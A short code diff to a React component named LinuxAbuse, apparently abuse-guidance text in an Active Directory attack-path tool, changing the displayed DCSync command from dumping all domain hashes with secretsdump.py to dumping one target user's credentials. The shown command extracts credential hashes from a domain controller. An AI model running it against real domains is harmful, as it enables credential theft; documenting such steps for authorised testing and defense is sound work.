@@ -98,7 +98,7 @@ const LinuxAbuse: FC = () => {
             <Typography variant='body1'>Step 4: DCSync target domain</Typography>
             <Typography variant='body2'>Use secretsdump.py to DCSync the target domain:</Typography>
             <Typography component={'pre'}>
-                {"secretsdump.py -just-dc -k '<domain>/<username>'@<target DC IP> -outputfile dcsync_hashes"}
+                {"secretsdump.py -k -just-dc-user <DOMAIN/targetuser> <target DC DNS name>"}
             </Typography>
         </>
     );
